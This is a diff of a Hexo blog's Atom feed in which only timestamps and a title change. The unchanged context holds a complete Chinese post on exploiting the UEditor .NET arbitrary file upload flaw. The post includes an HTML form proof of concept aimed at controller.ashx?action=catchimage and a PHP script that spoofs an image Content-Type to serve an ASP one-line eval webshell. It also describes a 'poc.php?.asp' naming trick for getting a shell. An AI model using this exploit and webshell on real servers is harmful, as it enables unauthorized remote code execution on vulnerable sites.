@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://zhengbao.wang/"/>
-  <updated>2019-09-25T12:47:32.528Z</updated>
+  <updated>2019-09-25T12:49:27.784Z</updated>
   <id>https://zhengbao.wang/</id>
   
   <author>
@@ -17,11 +17,11 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>UEditor . .net版本任意文件上传</title>
+    <title>UEditor .net版本任意文件上传</title>
     <link href="https://zhengbao.wang/UEditor-net%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     <id>https://zhengbao.wang/UEditor-net版本任意文件上传/</id>
     <published>2019-09-25T12:44:59.000Z</published>
-    <updated>2019-09-25T12:47:32.528Z</updated>
+    <updated>2019-09-25T12:49:27.784Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天在渗透过程中碰到了一个UEditor .net版本，刚好最近想更新下博客，记录一个getshell的过程。</p><h2 id="0x01-UEditor-net版本任意文件上传"><a href="#0x01-UEditor-net版本任意文件上传" class="headerlink" title="0x01 UEditor .net版本任意文件上传"></a>0x01 UEditor .net版本任意文件上传</h2><p>这个任意文件上传是18年8月份爆出来的，漏洞的成因是在获取图片资源时仅检查了ContentType，导致可以绕过达到任意文件上传。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (response.ContentType.IndexOf(<span class="string">"image"</span>) == -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                State = <span class="string">"Url is not an image"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>漏洞利用poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xx/ueditor/net/controller.ashx?action=catchimage"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"source[]"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在服务中构造绕过验证的一句话<code>submit</code>即可</p><p><img src="https://i.loli.net/2019/09/25/rjEqK5SJPvm19Gp.png" alt></p><p>因为这里只验证了contentType,所以可以在代码中伪造contentType,我所使用的为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: image/jpeg'</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;% eval request(\"cmd\") %&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我这里使用的是php文件，利用的时候可以采用<code>poc.php?.asp</code>的形式，这样上传后的文件就为asp文件了。</p><p>提交之后便会返回webshell路径</p><p><img src="https://i.loli.net/2019/09/25/LIQaEP3DTiJ9WO4.png" alt></p><h2 id="0x02-参考资料"><a href="#0x02-参考资料" class="headerlink" title="0x02 参考资料"></a>0x02 参考资料</h2><p><a href="https://www.jianshu.com/p/6dae608b617c?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">UEditor .net版本 getshell</a></p>]]></content>
     
